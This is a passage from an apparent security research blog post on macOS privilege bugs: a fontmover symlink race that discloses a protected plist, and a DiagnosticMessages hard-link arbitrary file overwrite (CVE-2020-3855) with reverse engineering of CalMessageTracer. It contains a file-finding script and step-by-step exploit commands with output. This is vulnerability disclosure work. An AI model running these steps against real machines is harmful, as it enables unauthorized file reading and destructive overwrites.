    (subpath &#34;/System/Library/Fonts (Removed)&#34;)
    (subpath &#34;/Library/Fonts&#34;)
    (subpath &#34;/Library/Fonts (Removed)&#34;)
)
</code></pre><p>This means that file writes will be limited to the <code>Fonts</code> directory, so even if symlinks would be followed, we are stuck in the <code>Fonts</code> directory..</p>
<h4 id="nix-directory-permissions">
  *nix directory permissions
  <a class="heading-link" href="#nix-directory-permissions">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>The file disclosure vulnerability happens with regards of the source file. Between the steps <code>Install Font</code> and <code>Install Ticked</code> the file is not locked by the application, which means that someone can alter the file after the font validation happened. If we remove the original file, and place a symlink pointing somewhere <code>fontmover</code> will follow the symlink and copy that file into <code>/Library/Fonts</code>, with maintaining the original file’s permission. What do we gain with this? We can copy a file as <code>root</code> to a location where we have already write access to with maintaining the original file’s permissions. At first sight this doesn’t give as any more rights as if we don’t have read access to the original file, then we won’t gain it because it maintains its access rights, and if we have read access to it we could already read it. NO. There is a corner case in *nix based filesystem, where the last statement is not true, and what I mentioned in the very beginning. If there are files in a directory where only root has R+X access, those are not accessible to anyone else. In case there is a file which normally would be readable by anyone, we can use <code>fontmover</code> to move that file out, into <code>/Library/Fonts</code> and read its contents, which normally would be forbidden.</p>
<p>This quick and dirty python script can find such files for us:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span><span style="color:#555">,</span> <span style="color:#0cf;font-weight:bold">stat</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fs <span style="color:#555">=</span> <span style="color:#366">open</span>(<span style="color:#c30">&#39;files.txt&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> root, dirs, files <span style="color:#000;font-weight:bold">in</span> os<span style="color:#555">.</span>walk(<span style="color:#c30">&#34;/&#34;</span>, topdown <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">True</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> f <span style="color:#000;font-weight:bold">in</span> files:
</span></span><span style="display:flex;"><span>		full_path <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(root, f)
</span></span><span style="display:flex;"><span>		directory <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path)
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (
</span></span><span style="display:flex;"><span>			((os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_mode <span style="color:#555">&amp;</span> stat<span style="color:#555">.</span>S_IRGRP <span style="color:#000;font-weight:bold">or</span> <span style="color:#09f;font-style:italic">#group has read access</span>
</span></span><span style="display:flex;"><span>			os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_mode <span style="color:#555">&amp;</span> stat<span style="color:#555">.</span>S_IROTH) <span style="color:#09f;font-style:italic">#world readable</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000;font-weight:bold">and</span> os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid <span style="color:#555">==</span> <span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic">#owner is root</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000;font-weight:bold">and</span>
</span></span><span style="display:flex;"><span>			((<span style="color:#000;font-weight:bold">not</span> os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_mode <span style="color:#555">&amp;</span> stat<span style="color:#555">.</span>S_IXGRP) <span style="color:#000;font-weight:bold">and</span> <span style="color:#09f;font-style:italic">#group doesn&#39;t have execute</span>
</span></span><span style="display:flex;"><span>			(<span style="color:#000;font-weight:bold">not</span> os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_mode <span style="color:#555">&amp;</span> stat<span style="color:#555">.</span>S_IXOTH)) <span style="color:#09f;font-style:italic">#others doesn&#39;t have execute</span>
</span></span><span style="display:flex;"><span>			):
</span></span><span style="display:flex;"><span>				<span style="color:#366">print</span>(<span style="color:#c30">&#34;[+] file: </span><span style="color:#a00">%s</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> full_path)
</span></span><span style="display:flex;"><span>				fs<span style="color:#555">.</span>write(<span style="color:#c30">&#34;[+] file: </span><span style="color:#a00">%s</span><span style="color:#c30;font-weight:bold">\r\n</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> full_path)
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>fs<span style="color:#555">.</span>close() 
</span></span></code></pre></div><p>One such file is:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">1043</span> Aug <span style="color:#f60">30</span> 16:10 /private/var/run/mds/uuid-tokenID.plist
</span></span></code></pre></div><h4 id="exploitation">
  Exploitation
  <a class="heading-link" href="#exploitation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>From here the exploitation is simple:</p>
<ol>
<li>Wait for a user installing a file</li>
<li>Before clicks “Install Ticked”, do this:
a. Delete / rename original file
b. Create a symlink to the file of your choice</li>
</ol>
<p>Note that the output was changed below:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#no access to original file</span>
</span></span><span style="display:flex;"><span>$ cat /private/var/run/mds/uuid-tokenID.plist
</span></span><span style="display:flex;"><span>cat: /private/var/run/mds/uuid-tokenID.plist: Permission denied
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#exploitation</span>
</span></span><span style="display:flex;"><span>$ mv great_fighter.otf great_orig.otf
</span></span><span style="display:flex;"><span>$ ln -s /private/var/run/mds/uuid-tokenID.plist great_fighter.otf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#click &#39;install ticked&#39; here</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ cat /Library/Fonts/great_fighter.otf 
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#033">version</span><span style="color:#555">=</span><span style="color:#c30">&#34;1.0&#34;</span> <span style="color:#033">encoding</span><span style="color:#555">=</span><span style="color:#c30">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#c30">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#c30">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#033">version</span><span style="color:#555">=</span><span style="color:#c30">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;nextTokenID&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;1234567890&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span></code></pre></div><h4 id="the-fix">
  The fix
  <a class="heading-link" href="#the-fix">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>There was an undocumented partial fix in Catalina 10.15.1. After the ‘fix’, it’s still possible to achieve the same but on another place. A user can modify the file prior the authentication takes place. There are some checks when the user clicks “Install Ticked”, however when the user gets the authentication prompt there is a time window again to alter the file, before the user authenticates. So the steps would be now:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> <span style="color:#09f;font-style:italic">#no access to original file</span>
</span></span><span style="display:flex;"><span> $ cat /private/var/run/mds/uuid-tokenID.plist
</span></span><span style="display:flex;"><span> cat: /private/var/run/mds/uuid-tokenID.plist: Permission denied
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#09f;font-style:italic">#click ‘install ticked’ here</span>
</span></span><span style="display:flex;"><span> <span style="color:#09f;font-style:italic">#wait for the authentication prompt</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#09f;font-style:italic">#exploitation</span>
</span></span><span style="display:flex;"><span> $ mv great_fighter.otf great_orig.otf
</span></span><span style="display:flex;"><span> $ ln -s /private/var/run/mds/uuid-tokenID.plist great_fighter.otf
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#09f;font-style:italic">#authenticate</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> $ cat /Library/Fonts/great_fighter.otf 
</span></span><span style="display:flex;"><span> <span style="color:#555">(</span>…<span style="color:#555">)</span> output omitted <span style="color:#555">(</span>…<span style="color:#555">)</span>
</span></span></code></pre></div><p>It was finally fixed in Catalina 10.15.2. There is a case, when you switch from User to Computer profile, and you will get the authentication prompt, and you can still replace the file, however the new redirect won’t be followed, and the bogus file won’t be copied. The only thing you achieve is that no font will be installed, which is fine.</p>
<h3 id="macos-diagnosticmessages-arbitrary-file-overwrite-vulnerability-cve-2020-3855">
  macOS DiagnosticMessages arbitrary file overwrite vulnerability (CVE-2020-3855)
  <a class="heading-link" href="#macos-diagnosticmessages-arbitrary-file-overwrite-vulnerability-cve-2020-3855">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>While I couldn’t achieve full LPE in this case, and so it remained an arbitrary file overwrite, I got some partial successes with a trick, which I think is interesting. Finally some reverse engineering ahead!</p>
<p>I noticed that <code>/private/var/log/DiagnosticMessages</code> is writeable for the <code>admin</code> group.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -l /private/var/log/ | grep Diag
</span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#f60">32</span> root             admin                 <span style="color:#f60">1024</span> Sep  <span style="color:#f60">2</span> 20:31 DiagnosticMessages
</span></span></code></pre></div><p>Additionally all files in that directory are owned by root:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#555">(</span>...<span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>-rw-r--r--@ <span style="color:#f60">2</span> root  wheel   <span style="color:#f60">420894</span> Aug <span style="color:#f60">31</span> 21:30 2019.08.31.asl
</span></span><span style="display:flex;"><span><span style="color:#555">(</span>...<span style="color:#555">)</span>
</span></span></code></pre></div><p>As usual I can delete this file, and create others, like a symlink in that folder.</p>
<h4 id="exploitation---overwriting-files">
  Exploitation - Overwriting files
  <a class="heading-link" href="#exploitation---overwriting-files">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>As discussed before exploiting such scenarios are typically very simple to the point where we overwrite a custom file, we create a symlink with the same name, and point it to somewhere where <code>root</code> has only access. In this case symlinks didn’t work for me, they weren’t properly followed. Luckily we have hard links as well, and that seemed to do the trick. As a POC I created a bogus file in Library and pointed a hardlink to it:</p>
<pre tabindex="0"><code>$ sudo touch /Library/asl.asl
$ rm 2019.09.02.asl

#you need to be quick creating the hardlink, as a new file might be created due to incoming logs
$ ln /Library/asl.asl 2019.09.02.asl
</code></pre><p>After that we can see that they are essentially the same:</p>
<pre tabindex="0"><code>$ ls -l 2019.09.02.asl
-rw-r--r--@ 2 root  wheel  1835 Sep  2 21:06 2019.09.02.asl
$ ls -l /Library/asl.asl 
-rw-r--r--@ 2 root  wheel  1835 Sep  2 21:06 /Library/asl.asl
</code></pre><p>If we take a look at the file content, we can indeed see that the output is properly redirected.</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.07.55.png" alt=""></p>
<p>At this point we can overwrite any file on the filesystem as root, possibly causing a DOS scenario with overwriting a critical file.</p>
<p>You might need to reboot in order for the hard link to take effect.</p>
<h4 id="exploitation---controlling-content">
  Exploitation - Controlling content
  <a class="heading-link" href="#exploitation---controlling-content">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>This is the more interesting part of my research, and I want to show how did I ended up injecting content into this log file - it wasn’t trivial.</p>
<p>The ultimate problem with the above, is that we can redirect an output, but ultimately we don’t control the content of the file, it’s up to the application, so I can’t create a nice cronjob file or plist to drop into the <code>LaunchDaemons</code> and gain code execution as root. Although we can’t control the entire file, we can still have some influence on the content, which could be useful later.</p>
<p>This is a log file, so if we could send some custom log messages that would be quite good as we could inject something useful for us. With that I started to dig into how can I create ASL (Apple System Log) logs directed into DiagnosticMessages.
ASL is Apple’s own syslog format, but these days it’s being deprecated and less and less applications use it. To complicate things, there are other folders containing ASL logs, like <code>/private/var/log/asl</code>. This link contains the documentation for the ASL API:
<a href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/asl.3.html"  class="external-link" target="_blank" rel="noopener">Mac OS X Manual Page For asl(3)</a>. The API doesn’t talk about the various log targets, or DiagnosticMessages at all. I’m not a developer and I looked for some ASL code samples, and there aren’t too many, and needles to say, none of those posts talk about the various log buckets. At this point I was quite clueless how to send anything there, even if I can use the API.</p>
<p>Additionally if we check out these logs, this is what we see typically:</p>
<pre tabindex="0"><code>com.apple.message.domain: com.apple.apsd.15918893
com.apple.message.__source__: SPI
com.apple.message.signature: 1st Party
com.apple.message.signature2: N/A
com.apple.message.signature3: NO
com.apple.message.summarize: YES
SenderMachUUID: 399BDED0-DC36-38A3-9ADC-9F97302C3F08
</code></pre><p>It seemed that there are some pre-defined fields to be populated, that can take up some value, and that’s it. It looked quite hopeless to send here anything useful. But you always try harder :)</p>
<p>The hope came from a few logs hidden in the chaos, which looked like this:</p>
<pre tabindex="0"><code>CalDAV account refresh completed
com.apple.message.domain: com.apple.sleepservices.icalData
com.apple.message.signature: CalDAV account refresh statistics
com.apple.message.result: noop
com.apple.message.value: 0
com.apple.message.value2: 0
com.apple.message.value3: 0
com.apple.message.uuid: XXXXXXXXXX
com.apple.message.uuid2: XXXXXXXXXX
com.apple.message.wake_state: 0
SenderMachUUID: XXXXXXXXXX
</code></pre><p>The nice thing about this entry was that there was a custom string at the very beginning. This one came from the <code>CalendarAgent</code> process. This led me to figure out how Calendar does this, and if I can reverse it, I could do my own.</p>
<p>First I took the <code>CalendarAgent</code> binary that can be found at <code>/System/Library/PrivateFrameworks/CalendarAgent.framework/Versions/A/CalendarAgent</code> . I loaded this to Hopper, but couldn’t locate any string related to the message above. So I decided to  just search for it with <code>grep</code> and that gave me the file I needed.</p>
<pre tabindex="0"><code>grep -R &#34;CalDAV account refresh&#34; /System/Library/PrivateFrameworks/

Binary file /System/Library/PrivateFrameworks//CalendarPersistence.framework/Versions/Current/CalendarPersistence matches
</code></pre><p>If we load the binary into Hopper, we can follow where that string is referenced:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.36.00.png" alt=""></p>
<p>It’s stored in a variable, and luckily it’s only referenced in one place:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.36.24.png" alt=""></p>
<p>Reading the related assembly is not that nice:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.39.09.png" alt=""></p>
<p>But luckily Hopper can do some awesome pseudo-code generation for us, and this is what we get for the entire function:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.41.38.png" alt=""></p>
<p>TXT format:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class CalDAVAccountRefreshQueueableOperation */</span>
</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">sendStatistics</span> {
</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> <span style="color:#366">self</span>;
</span></span><span style="display:flex;"><span>    var_30 <span style="color:#555">=</span> <span style="color:#555">**</span>___stack_chk_guard;
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> IOPMGetUUID(<span style="color:#f60">0x3e9</span>, <span style="color:#555">&amp;</span>var_A0, <span style="color:#f60">0x64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> <span style="color:#555">&amp;</span>stack[<span style="color:#555">-</span><span style="color:#f60">216</span>];
</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#555">&amp;</span>stack[<span style="color:#555">-</span><span style="color:#f60">216</span>] <span style="color:#555">-</span> <span style="color:#f60">0x70</span>;
</span></span><span style="display:flex;"><span>            rsp <span style="color:#555">=</span> rbx;
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (IOPMGetUUID(<span style="color:#f60">0x3e8</span>, rbx, <span style="color:#f60">0x64</span>) <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>                    var_C8 <span style="color:#555">=</span> r14;
</span></span><span style="display:flex;"><span>                    var_C0 <span style="color:#555">=</span> [[NSNumber <span style="color:#99f">numberWithInteger</span>:[r13 numberOfInboxEntriesAffected]] <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [r13 numberOfEventsAffected];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [NSNumber <span style="color:#99f">numberWithInteger</span>:rax];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    r15 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>                    var_B0 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>                    var_B8 <span style="color:#555">=</span> [[NSNumber <span style="color:#99f">numberWithInteger</span>:[r13 numberOfNotificationsAffected]] <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithUTF8String</span>:rbx];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>                    var_A8 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithUTF8String</span>:<span style="color:#555">&amp;</span>var_A0];
</span></span><span style="display:flex;"><span>                    r14 <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> @(<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    var_28 <span style="color:#555">=</span> r15;
</span></span><span style="display:flex;"><span>                    var_30 <span style="color:#555">=</span> var_C0;
</span></span><span style="display:flex;"><span>                    [CalMessageTracer <span style="color:#99f">log</span>:<span style="color:#c30">@&#34;CalDAV account refresh completed&#34;</span> <span style="color:#99f">domain</span>:<span style="color:#c30">@&#34;com.apple.sleepservices.icalData&#34;</span> <span style="color:#99f">signature</span>:<span style="color:#c30">@&#34;CalDAV account refresh statistics&#34;</span> <span style="color:#99f">result</span>:<span style="color:#f60">0x0</span> <span style="color:#99f">value</span>:var_30 <span style="color:#99f">value2</span>:var_28 <span style="color:#99f">value3</span>:var_B8 <span style="color:#99f">uid</span>:rbx <span style="color:#99f">uid2</span>:r14 <span style="color:#99f">wakeState</span>:rax];
</span></span><span style="display:flex;"><span>                    [rax <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    rdi <span style="color:#555">=</span> r14;
</span></span><span style="display:flex;"><span>                    r14 <span style="color:#555">=</span> var_C8;
</span></span><span style="display:flex;"><span>                    [rdi <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    [var_A8 <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    [var_B8 <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    [var_B0 <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    [var_C0 <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">**</span>___stack_chk_guard <span style="color:#555">!=</span> var_30) {
</span></span><span style="display:flex;"><span>            __stack_chk_fail();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is nice and easy to read, and we can see right away that the log is generated by calling the <code>CalMessageTracer</code> function. This function can be found in the <code>CalendarFoundation</code> binary, which is here: <code>/System/Library/PrivateFrameworks//CalendarFoundation.framework/Versions/Current/CalendarFoundation</code>. If we check the function we can see that indeed it will use the ASL API:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-02%20at%2021.44.14.png" alt=""></p>
<p>But things weren’t as straightforward. If we track the <code>CalDAV account refresh completed</code> string / argument, we can see that it’s the first parameter of the <code>CalMessageTracer</code> function. Its life will be:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>var_78 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>(...)
</span></span><span style="display:flex;"><span>r13 <span style="color:#555">=</span> var_78;
</span></span><span style="display:flex;"><span>(...)
</span></span></code></pre></div><p>and then we get to this huge blob:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> (r13 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(int32_t <span style="color:#555">*</span>)_CalLogCurrentLevel <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> [_CalLogWhiteList() <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>                    r13 <span style="color:#555">=</span> [rbx <span style="color:#99f">containsObject</span>:<span style="color:#555">*</span>_CalFoundationNS_Log_MessageTrace];
</span></span><span style="display:flex;"><span>                    [rbx <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>                    COND <span style="color:#555">=</span> r13 <span style="color:#555">!=</span> <span style="color:#f60">0x1</span>;
</span></span><span style="display:flex;"><span>                    r13 <span style="color:#555">=</span> var_78;
</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>COND) {
</span></span><span style="display:flex;"><span>                            CFAbsoluteTimeGetCurrent();
</span></span><span style="display:flex;"><span>                            _CalLogActual(<span style="color:#555">*</span>_CalFoundationNS_Log_MessageTrace, <span style="color:#f60">0x0</span>, <span style="color:#c30">&#34;+[CalMessageTracer log:domain:signature:signature2:result:value:value2:value3:uid:uid2:wakeState:summarize:]&#34;</span>, <span style="color:#c30">@&#34;%@&#34;</span>, r13, r9, stack[<span style="color:#555">-</span><span style="color:#f60">152</span>]);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>                    CFAbsoluteTimeGetCurrent();
</span></span><span style="display:flex;"><span>                    _CalLogActual(<span style="color:#555">*</span>_CalFoundationNS_Log_MessageTrace, <span style="color:#f60">0x0</span>, <span style="color:#c30">&#34;+[CalMessageTracer log:domain:signature:signature2:result:value:value2:value3:uid:uid2:wakeState:summarize:]&#34;</span>, <span style="color:#c30">@&#34;%@&#34;</span>, r13, r9, stack[<span style="color:#555">-</span><span style="color:#f60">152</span>]);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            asl_log(<span style="color:#f60">0x0</span>, r15, <span style="color:#f60">0x5</span>, <span style="color:#c30">&#34;%s&#34;</span>, [objc_retainAutorelease(r13) UTF8String]);
</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> var_38;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>So if there is a custom message, additional function calls are involved. This is the point where I stopped, and since <code>CalMessageTracer</code> can already do what I want (it will wrap the ASL API for me) I can use just that. I didn’t need to generate a header file, as I could find it here:
<a href="https://github.com/w0lfschild/macOS_headers/blob/master/macOS/PrivateFrameworks/CalendarFoundation/548/CalMessageTracer.h"  class="external-link" target="_blank" rel="noopener">macOS_headers/CalMessageTracer.h at master · w0lfschild/macOS_headers · GitHub</a></p>
<p>It wasn’t new, but it worked.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/NSObject.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">CalMessageTracer</span> : <span style="color:#0a8;font-weight:bold">NSObject</span>
